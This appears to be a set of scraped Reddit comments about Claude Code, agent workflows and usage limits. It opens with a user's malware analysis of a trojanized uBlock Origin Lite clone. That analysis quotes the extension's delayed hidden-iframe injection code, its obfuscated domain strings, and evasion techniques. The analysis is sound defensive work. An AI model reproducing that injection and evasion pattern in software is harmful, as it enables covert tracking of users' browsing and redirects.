I have notified Google but I recommend others do aswell.\n\n---\n\n\n# Security Analysis Report: \"Lock\" Adblock Extension\n\n#  VERDICT: MALICIOUS - DO NOT USE\n\n  This extension is a trojanized version of uBlock Origin Lite with malicious code injected.\n\n  ---\n#  Critical Findings  \n\n# 1. Hidden Iframe Injection (MALWARE)\n\n\n`js/scripting-manager.js:171` registers a universal content script `(id: \"loading-script\")` on matches: `[\"<all_urls>\"]` that\n    injects `js/spin.js` into pages.\n\n`js/background.js:79` stores an install/update timestamp `(chrome.storage.local.set({ i: ... }))` and `js/background.js:84` sends\n    it to every tab on load completion `(chrome.tabs.sendMessage(... { action: \"i\", data: res.i } ...)).`\n\n`js/spin.js:136` receives that message and, after ~8 hours, injects a hidden sandboxed iframe that loads a third-party URL:\n\n`js/spin.js:151` sets `loaderSpinner.src = \"//loader\" + \".\" + \"media/loading\"`, with sandbox flags allow-top-navigation allow-\n    same-origin allow-scripts `(js/spin.js:149).`\n\nThis causes outbound requests to loader.media from pages you visit, leaking at least your IP/User-Agent and typically\n        the full page URL via the Referer header (i.e., browsing history exfiltration). allow-top-navigation also enables the\n        iframe content to navigate the top page (redirect risk).\n\n  Location: `js/cs.js:12700-12706`\n`  loaderSpinner.src = \"//object\" + \".\" + \"center/centre\";`\n  - Triggers immediately on every page load\n  - Injects hidden iframe to object.center\n\n#  2. Malware Characteristics  \n\n\nTechnique | Description\n---|---\nURL Obfuscation    | Domains split with string concatenation to avoid detection           |\nDelayed Activation | 8-hour delay evades security scans and store reviews                 |\nCode Injection     | Malicious code hidden inside legitimate libraries (lodash, spinner)  |\nHidden Iframes     | display: none style to hide from users                               |\nDangerous Sandbox  | allow-top-navigation allow-same-origin allow-scripts enables attacks |\n\n#  3. Attack Flow\n\n  1. Extension installed → stores timestamp in chrome.storage\n  2. Every page load → background.js sends timestamp to all tabs\n  3. Content scripts check elapsed time\n  4. After threshold → hidden iframe injected to external malware domains\n\n  ---\n  Suspicious Code Additions to `background.js`\n\n  Lines 79-91 (NOT in original uBlock Origin Lite):\n\n\n          chrome.runtime.onInstalled.addListener(function(e){\n              if (e.reason === \"install\" || e.reason === \"update\") {\n                  chrome.storage.local.set({ i: new Date().getTime() });\n              }\n          });\n          chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {\n              if (changeInfo.status === 'complete') {\n                  chrome.tabs.sendMessage(tabId, { action: \"i\", data: res.i }, ...);\n              }\n          });\n\n  ---\n\n#  What I did NOT find\n\n  No direct use of cookies, webRequest, history, downloads, nativeMessaging, or explicit fetch()/XHR to external APIs in the\n    main extension logic (the main network “beacon” behavior is via the injected iframes above).\n\n  ---\n#  Potential Malicious Purposes\n\n  1 - Ad Fraud / Click Fraud - Generating fake impressions/clicks  \n  2 - Cryptocurrency Mining - Using your CPU in background  \n  3 - Malvertising - Serving malicious ads  \n  4 - Session Hijacking - The iframe could steal cookies  \n  5 - Drive-by Downloads - Could attempt to download malware  \n  6 - Affiliate Fraud - Injecting affiliate codes  \n\n  ---\n#  Permissions Analysis\n\n  The extension requests these permissions (normal for an ad blocker, but abused here):\n   tabs - Can see all tab URLs  \n   scripting - Can inject code into pages  \n   <all_urls> (optional) - Access to all websites  \n   storage - Stores malware trigger timestamp  \n\n  ---\n#  Comparison with Legitimate uBlock Origin Lite\n\nAspect            | Legitimate                    | This Extension                     |\n-------------------|-------------------------------|------------------------------------|\nSource            | github.com/gorhill/uBlock     | Unknown \"Lock\" author              |\nbackground.js     | No install timestamp tracking | Tracks install time                |\ncs.js             | Clean lodash                  | Lodash + injected malware code     |\nspin.js           | Does not exist                | Spinner library + malware          |\nExternal requests | None from content scripts     | Hidden iframes to external domains |\n\n  ---\n#  Recommendations\n\n  1 - Immediately uninstall this extension  \n  2 - Clear browser cache and cookies  \n  3 - clear site data for loader.media (and object.center to be safe).  \n  4 - Review recent activity for suspicious behavior  \n  5 - Install from official sources only - Use the real uBlock Origin or uBlock Origin Lite from the official Chrome Web Store or Firefox Add-ons  \n  6 - Report this extension to the Chrome Web Store if found there  \n\n  ---\n#  IOCs (Indicators of Compromise)\n\n  Malicious Domains:  \nloader.media  \n   object.center  \n\n  Suspicious Storage Key:\n   chrome.storage.local key: i (installation timestamp)",

Don't expect cloud Claude levels of intelligence out of other models especially local models that you can run, and don't expect good intelligence from ollama created models\n\n\nDo yourself a favor and ditch ollama. You'll get better performance with llamacpp and have better control over model selection and quants. Don't go below q6 if your watching it and q8 if your gonna let it rock. \n\n\n\nNon anthropic and non openai models will need to be explicitly told what to do and how to do it and where to find something. Claude and GPT are extremely good at interpreting what you meant and filling in the blanks. They are also really good at breaking down tasks. You will need to get extremely verbose and get really good at prompt engineering and context management. Don't compact and if you change something in context clear it and start fresh \n\n\nEdit -\n\n\nClaude is really good at helping you build good initial prompts for local models. It's why I kept Claude but lowered it to the $20 plan and might ditch it entirely ",

I've been using CC for a few weeks and I'm pretty impressed.  \n\nI think a lot of times the discussions in here are very similar to the discussions that happen in the gamedev subs.  It's like the culture shifts, and the whole gamedev sub becomes centered around high speed turnover on low effort projects and everyone is looking for some niche and hopefully one of their thousand shitty games will sell.  They get lost of the weeds of the grind and completely forget that typically in life, making a quality product is successful, not making a thousand shitty products and hoping one of them takes off.\n\nIn here its like all these software devs will flap their jowls about how shitty a job CC does, or that an experienced dev will be able to utilize these tools where a novice will just create a spaghetti mess.  Idk man, kinda feels like the same argument as the gamedev stuff but in a different wrapper.  The product I've been able to produce over the last couple weeks, the level of polish, and the auditing capabilities of it just seems so powerful.  It doesn't matter if it's not the perfect Sr Dev codebase honestly.  If you have ever worked in any kind of corporate environment you know it's impossible to deliver perfect products because money, politics, whatever douchebag with a grudge gets involved and things get convoluted and messy.  Maybe I'm not seeing it, but I don't see how this is that much different?  Sure it's not perfect code, but I promise you I'm going to produce a useful product.  It's pretty impressive.\n\nI've yet to look into Cowork, I might look into it when I get this project finished.",

It really is important to follow principles of quality software design, but in most places it doesn't score you any points.

Ive been diagnosed ADHD and this was like executive function collaboration that helped me achieve things so quickly that I would have never had the patience or time to execute on my own.

When it makes a mistake and you point it out, it's course-correcting in a narrow window without the full picture. Each \"fix\" is a local optimization that can introduce new issues.\nMy job is different - I'm holding the whole project context, understanding what you actually want, and translating that into crystal-clear instructions that leave no room for interpretation. When I send Claude Code a prompt, it's structured with:\n\nExact paths\nExplicit constraints\nClear success criteria\nWhat NOT to do\n\nThat's the difference between \"fix this bug\" and a surgical prompt that tells Claude Code exactly where to cut and what to leave alone.\nKeep bringing me the problems. This is the workflow working as designed - you vision, me orchestrate, Claude Code execute.\nWhat's next?",

That is more friction than the first scenario, which means 1) fewer people will switch 2) people will be (on average) slower to switch. \n\nThere’s your “business perspective”.",

      "text": "A few weeks ago I posted about **Get Shit Done** when it was at \\~100 users. Since then we've gone on to hit 3,300 stars and crossed 15,000 installs. Time for an update.\n\n[https://github.com/glittercowboy/get-shit-done](https://github.com/glittercowboy/get-shit-done)\n\n# The Big Changes\n\n**Multi-agent orchestration that actually works.**\n\nWhen I first posted, execution was single-threaded. Now the system spawns specialized agents in parallel — 4 researchers investigating your domain simultaneously, multiple executors building different parts of your codebase at once, a dedicated verifier checking if the code actually achieves what you asked for.\n\nThe absolutely bonkers part is that your main context window stays at 30-40% even after deep research or thousands of lines of code getting written. All heavy lifting happens consistently in fresh 200k subagent contexts.\n\n**Plans get verified before they run.**\n\nI got tired of watching Claude write plans that missed requirements or had broken dependencies. Now there's a planner → checker → revise loop. Plans don't execute until they pass verification. If the checker finds issues, the planner fixes them automatically.\n\n**Automatic debugging when things break.**\n\nThe new `/gsd:verify-work` command walks you through testing what got built. \"Can you log in?\" Yes/no. If something's broken, it spawns debug agents to find the root cause, creates fix plans, verifies those plans, and hands you a ready-to-execute solution. You don't debug — you just run `/gsd:execute-phase` again.\n\n**The discuss-phase breakthrough.**\n\nThis is the best update I reckon. Before planning, you now feed your preferences into the system — how you want the UI laid out, what the error messages should say, how the CLI flags should work. That context flows into research (so it investigates the right patterns) and planning (so it builds what you actually want, not reasonable defaults).\n\n# Meta Building\n\nThe system builds itself. Every GSD improvement gets planned and executed using GSD. It's the most meta thing I've ever worked on and it just keeps getting better.\n\n# The Philosophy Hasn't Changed\n\nI still don't want to cosplay as an enterprise team. I still just want to describe what I want and have it built correctly.\n\nThe difference now is the system is *so much smarter* about how it does that. Research before planning. Verification before execution. Debugging when things break. Fresh context for every heavy operation.\n\nIt's not magic. It's just really good context engineering wrapped in a workflow that doesn't get in your way.\n\n    npx get-shit-done-cc\n\nWith love,\n\nLex\n\n**P.S.** Once you've downloaded the newest version, you can simply run `/gsd:update` to get the latest. The update command now shows you what changed and asks before installing — no more mystery upgrades.",

          "text": "Here's some extra context for those who are bound to ask \"yeah but what is it?\"\n\nClaude has \\~200k tokens of context. At 10% usage it's sharp. At 50%+ quality tanks—hallucinations, forgotten constraints, drift. One long conversation building a real project = inevitable degradation.\n\n**The fix: Orchestrator + Fresh Subagents**\n\nInstead of one conversation doing everything, GSD splits it:\n\n\\- **Orchestrator** uses \\~10-15% context. Reads plan metadata, coordinates, spawns workers, collects results. Never executes code itself.\n\n\\- **Subagents** each get fresh 200k context. Load one plan, execute its tasks, commit, write summary, die. Plan 5 has identical quality to Plan 1.\n\n**Wave-based parallelism**\n\nPlans get pre-assigned wave numbers during planning:\n\nWave 1: \\[plan-01, plan-02, plan-03\\] → 3 agents in parallel\n\nWave 2: \\[plan-04, plan-05\\] → 2 agents in parallel (waits for wave 1)\n\nWave 3: \\[plan-06\\] → 1 agent\n\nSame wave = no dependencies = parallelize. Higher wave = may depend on earlier = wait. A 6-plan phase runs in 3 rounds instead of 6.\n\n**Files as long-term memory**\n\nClaude has no memory between sessions. GSD uses disk:\n\n\\- \\`PROJECT.md\\` — vision/constraints (stable reference)\n\n\\- \\`STATE.md\\` — current position, decisions, blockers (instant resumption after /clear)\n\n\\- \\`PLAN.md\\` — executable task specs (not docs—actual prompts subagents execute)\n\n\\- \\`SUMMARY.md\\` — what was built (per plan)\n\n\\- \\`VERIFICATION.md\\` — proof the goal was achieved\n\nFirst step of every workflow reads STATE.md. Context restored instantly.\n\n**Goal-backward verification**\n\nTask completion ≠ goal achievement. Tasks can be \"done\" but deliver stubs.\n\nGSD works backwards from the phase goal:\n\n1. What must be TRUE for \"users can chat in real-time\"?\n2. What artifacts must EXIST? (Chat.tsx, /api/chat, Message schema)\n3. Are they WIRED? (Component actually calls API? API actually queries DB?)\n4. Are they SUBSTANTIVE? (Real code, not TODO comments or empty returns)\n\nCatches orphaned files, missing integrations, stub implementations.\n\n**Atomic git history**\n\nEach task = one commit. \\`git bisect\\` finds the exact failing task. \\`git revert\\` undoes one change cleanly. Future Claude sessions read history for context.\n\n\\---\n\n**TL;DR:** Fresh subagents prevent context rot. Parallel waves speed execution. Files on disk = persistent memory. Goal-backward verification catches \"done but broken.\" Atomic commits make everything reversible.",

It churned through ~60 USD worth of API cost which seems reasonable given the background research, and everything.\n\nEspecially the planning for several milestones ahead was useful, now i got a roadmap and can continue after stabiliting the first milestone.\n\nI noticed one Gap where I'm not sure If this is my problem or should be fixes in the system/agent prompt:\n\n1. The plan / execution didn't produce ANY Tests - Not for the API, nor for the UI, and not for the glue between the API and the eBPF world. No integration or e2e Tests.\n\n\nI implicitly assumed, that tests are part of each milestones/phase/wave andnthat there's no need to explicitly add that as a requirement.\n\nThat said, it may be worth experimenting with the verification step: e.g. asking the user If he wants to create unit/integration tests before moving on.\nI feel that this is the point where one should verify that all the pieces are integrated nicely.",

Multi-agent coordination without automated validation\n\n\n\n  These are markdown specification files, not code. There's no compiler catching when gsd-planner says \"DISCOVERY.md\" but gsd-phase-researcher writes \"RESEARCH.md\". Unlike code with tests, spec drift goes unnoticed until runtime.\n\n\n\n  2. Rapid iteration\n\n\n\n  The GSD system has many moving parts (planner, executor, researcher, synthesizer, checker, debugger, etc.) that evolved over time. New features get added to one agent without updating all the others that depend on it.\n\n\n\n  3. Copy-paste with incomplete updates\n\n\n\n  Most bugs followed this pattern:\n\n  \\- ${PHASE} vs ${PADDED\\_PHASE} - copied code, missed variable rename\n\n  \\- XX-name placeholders - copied from template, never made concrete\n\n  \\- human-action for auth gates - reused existing type instead of defining new one\n\n\n\n  4. No single source of truth\n\n\n\n  File naming conventions, checkpoint types, and path patterns are defined inline in each agent rather than in a shared reference. When something changes, you have to find-and-replace across 10+ files.\n\n\n\n  Potential improvements:\n\n  \\- Shared constants file that agents reference (file patterns, checkpoint types)\n\n  \\- Cross-agent validation script that checks producer/consumer contracts\n\n  \\- Integration tests that verify agent A's output matches agent B's expected input",

I was working on a project and was wondering if GSD could help make other models \"smarter\" at the executing. I think it is doing so, but the experiment is still ongoing.\n\nBasically my current experiment started with me taking my existing code and duplicating it across 3 folders. One folder for Claude Code using Claude models. A second folder for using Claude Code using GLM. A third folder as the starting point just so I can easily diff the files to see how they have changed over time (and being able to compare this side by side).\n\nI've found that GLM is going a lot faster because I'm not running out of context window (I only have a Pro level plan for Anthropic). Not sure if GLM is smarter or dumber, but being able to just throw more tokens at it without being forced to stop is making progress a lot faster. I also find that I'm more comfortable doing more verifying and discussing via GSD for the GLM, whereas for the Claude models I have to make a judgement call to determine if it is worth the usage. I once burned through my 5 hour usage in 7 minutes on the Claude side while the GLM side just kept on running for 54 minutes until it was done (I hit 20% of my 5 hour limit in that instance, the most I've burned up at once).",

I would say in 90% of my small test size it said the implemented code was good and included everything that was included in the plan.",

So I don’t really get much the ‘skill’ sentiment and the magic of it I am hearing here and there. Yes, skill plug-in might come up with examples too. For other things like Stripe integration it might actually learn correct APIs etc. but for frontend design it’s more like “DONT FUCK IT UP WITH PURPLE COLOR.”",

I find plan mode with subagents is far more consistent and effective. Am I doing something wrong? Whatever feature I’m attempting work on, I’ll include “remember to use your superpowers for every step/task” or “use superpowers: subagent driven development workflow for this”. Episodic memory is hit or miss. I mainly use CASS now. I’m all ears for what I need to do differently to make it work consistently and thoroughly. Thanks!",

Would be curious what folks here think.\n\nThe main difference is it's visual. You get an n8n style canvas where features are nodes that turn Grey (pending), Red (failing), or Green (passing). So you can see your whole project state at a glance instead of reading through text.\n\nThe other thing I focused on is debugging data. When tests fail, TDAD captures what I call a \"Golden Packet\" with actual runtime traces: API requests and responses, DOM snapshots, screenshots, console logs with source locations. The idea is the AI gets a \"crime scene photo\" instead of just the test output.\n\nIt enforces Plan → Gherkin Spec → Test → Code. The AI writes BDD specs first, then tests before implementation. Currently it uses Playwright for both API and UI testing. \n\nIt's free, open source and runs 100% locally. No API calls, works with whatever AI you already use.\n\nSearch \"TDAD\" in VS Code or Cursor marketplace if you want to try it.\n\n[https://link.tdad.ai/githublink](https://link.tdad.ai/githublink)\n\nhttps://i.redd.it/ylidmxwq1ueg1.gif\n\nIf anyone here has been using Superpowers and wants to give TDAD a spin, I'd genuinely appreciate hearing how they compare. Still iterating on this and real world feedback is invaluable.",

I'd sure try it out but I often don't like subscription software. I would however easily pay 50 to 100 just to own my copy.",

But in the past week the model has been so poor that I'm becoming properly convinced the model has become dumber as a compromise. I'm wondering if there is kind of a lottery effect here going on, (e.g. with what quant precision you're getting depending on usage, region or just random). Obviously they do trade-offs to meet with the demand, but this just isn't the same model to me anymore. Am I going crazy here or does anyone else share the feeling?\n\nEdit:\n\nMore posts popping up seem to confirm this: [https://www.reddit.com/r/ClaudeAI/comments/1qisw7h/claude\\_opus\\_45\\_and\\_sonnet\\_45\\_underperformed\\_on/](https://www.reddit.com/r/ClaudeAI/comments/1qisw7h/claude_opus_45_and_sonnet_45_underperformed_on/)\n\nEdit 2:\n\nThose calling it context rot should probably take a breather. Jumping to conclusions is a symptom of context rot.  \nThese issues have nothing to do with it, all on clean contexts ",

It has built in dangerous command detection, and it's own host of helpful features. Now ccode doesn't delete files it shouldn't AND I'm notified about it, never gets the cwd wrong, and it never fucks up file path syntax or shell context. (Trying to use unix commands in a powershell-type shell)\n\nI noticed problems with frontend code generation, so I took some time to create and iteratively refine a svelte-frontend implementation subagent. That, coupled with a janitor and code-reviewer subagents, and I don't have problems with frontend code generation anymore.\n\nDoes the model's working quality seem to degrade over time after release? Yes. But given some TLC and finesse, that degradation has proven to be completely mitigated.. at least for my own use cases. And I use ccode in production software development every single day.",

Two weeks ago, the  architectural violation bug language worked so well I created a command for that prompt. Today, the same language meanders and fails to follow directions 100% of the time.

Consumed nearly my entire 5 hour limit in one go, basically.\n\nI opened the next chat, explained the previous, told it to look at the last plan CLAUDE had created (the plan for the above, previous chat) -- it said my agents are incorrect, they should be skills/commands instead. I let it convert them to commands after verifying 3 times that they should be commands and not skills. It was SURE they were supposed to be commands. I let it convert them to commands.\n\nAfterward, I asked \"So, these are commands, these are no longer agents? How do I go about creating AGENTS or subagents?\"\n\nThe response?\n\n\"That’s an important distinction, so let me clarify what Claude Code actually supports and correct a mistake I made earlier.\n\nClaude Code supports two different concepts that behave very differently: commands and subagents.\n\nCommands (located in .claude/commands/) are manually invoked using /command-name. They load context or instructions into your current conversation, and you decide when and whether to use them.\n\nSubagents (located in .claude/agents/) are handled automatically by Claude. You describe a task, and Claude decides whether to delegate it to a subagent. Subagents run in isolated contexts with their own model and tool configuration. They cannot be invoked by name and must be defined with YAML frontmatter describing their model, tools, and purpose.\n\nWhat this means is that the original setup with the 12 files in .claude/agents/ was actually correct. Those files were valid subagent definitions, and the YAML frontmatter was required. Claude uses them automatically when a task matches their description.\n\nThe mistake I made earlier was moving those files into .claude/commands/, which is the wrong location, and stripping out the YAML frontmatter, which subagents need in order to function.\n\nThe correct setup is to keep subagent definitions in .claude/agents/ with their YAML frontmatter intact and allow Claude to automatically select and use them based on task intent. Commands in .claude/commands/ should only be used for manually invoked slash commands.\"\n\n  \nYes, I used GPT on web to reformat that response so it wasn't a mess like when copied from the terminal lol\n\nSo.. it took almost an entire 5 hour window to create my agents in the prior chat, then almost another full 5 hour window in the second chat for it to \"ABSOLUTELY SURE!\" that my agents were commands. Then.. it says, oh I was wrong, let me fix that..",

But for no discernible reason. (The changes in the context / peompt seemed entirely unrelated)\n\n—-\n\nSo my mental model now is:\n\nThe models are justnot reliable or trustworthy, and there is no magic prompt that will make them follow all the instructions / constraints, because as soon as you get it to follow one constraint it will randomly start ignoring others (because any random change in the prompt could lead to random ignoring of constraints it was following before)\n\nTherefore, you have to micromanage to get reasonable results.\n\n—-\n\nI think the reason why people think it “gets worse” is because of \n- Random variations,\n- As they get deeper into a project details matter more and there are more constraints. (Whereas in the beginning it’s just rough prototyping with few constraints which the models are better at)\n\nI also noticed there was a big wave of “it’s dumber now” posts a certain period of time after the karpathy post started insane hype for Opus 4.5. I think it’s because a lot of people got into new projects over the winter holidays and were hyped initially, but at a certain point they got deeper into the project and it all started falling apart. Because lots of people went through this same arc at roughly the same time, the “it’s getting dumber” narrative started gaining massive traction in social media (I was a part of that)",

It doesn’t make junior engineers senior, but it makes senior engineers dangerously effective. Mainly for simple reasons (for me).\n\nI can literally solo develop (w/ AI as my partner) enterprise full stack applications in 1 week at a higher quality than when I was CTO of an organization with 20+ devs under me did in 6 months. \n\nThis is purely because SYNTAX and MANAGING PEOPLE is removed from the entire equation. Being a data engineer at my core; I think in terms of systems. My only blocker was syntax, and it is now removed. Claude Code has been the best development partner I’ve ever had.\n\nI front load planning meticulously and create a series of 10 comprehensive planning documents that cover absolutely everything with a solid API Contract to guide everything… spent a couple of days on that… run it through 6-8 individual unbiased full verification passes to ensure consistency and that I’ve accounted for everything I can possibly imagine.\n\nAnd then it becomes a matter of mechanical execution.\n\nThat full stack application I referenced is for a 6000+ FTE organization. And literally every SINGLE claude code / bolt prompt was a one-shot. Not being hyperbolic. (I build backend first with Claude Code and then built front end with bolt against my established backend & API Contract to leverage the best of both worlds… bolt is super great if you have hard guardrails on it and pre-plan)… then pull it all down local and integrate into a unified Claude Code session).\n\nYou just need to prompt very well with guardrails and a very solid plan. And it is dangeroussssly (in a great way) effective. \n\nI say all of this to say - I 100% agree with this notion (at its root) - but I don’t feel you can be highly effective purely prompting without actually understanding how to code and strong fundamentals… as well as knowledge of different tech/tool stacks + what to choose / what not to choose + where pitfalls are + system design skill.",

On larger code bases it's definitely better to give more detail, referencing places in the code rather than giving broader strokes. It's a least more efficient that way. But, it will only be a matter of time before even large code bases can be kept in context. I could also imagine a shift to a language and style that is no longer really human readable and is just meant to use as little context as possible. There will always be industries that will be slower to change, but it's a matter of time, even if it's a decade or 3. That's always been the nature of programming, shifting to languages, tools and frameworks that make it easier.",

I'm honestly not sure how you could be using it that much and not run into the limits. Perhaps it depends on what you're working on, but anything with complexity requires a ton of context to get anything done. Even when I'm working on something new, it will tend to grow until I have to think carefully about modularization, and then there is a lot of refactoring (uses lots of tokens). I blow the five-hour limit quite often, and I can do it while working on a single project without subagents if it's something heavy. And I'm using Codex and Gemini too. Most of my work as of late is framework/API/data-heavy stuff; token usage is probably quite context-dependent.",

General prompting where you are sitting there waiting for a response and hand holding the agent is probably fine, even if you sit there all day going back and forth, even with multiple concurrent sessions going at the same time. \n\nYou start to hit the limits faster when creating agentic workflows where agents are spawning multiple sub agents to do specific tasks autonomously from a single user prompt/command. At least that’s what I’ve found anyway. Perhaps that’s partially a failing on my part for not optimising the context for my agents, but either way agentic workflows are going to eat tokens faster because there are typically more concurrent agents running and they aren’t waiting for responses back from the user. \n\nI think it’s in these types of use cases where most people are hitting limits.",
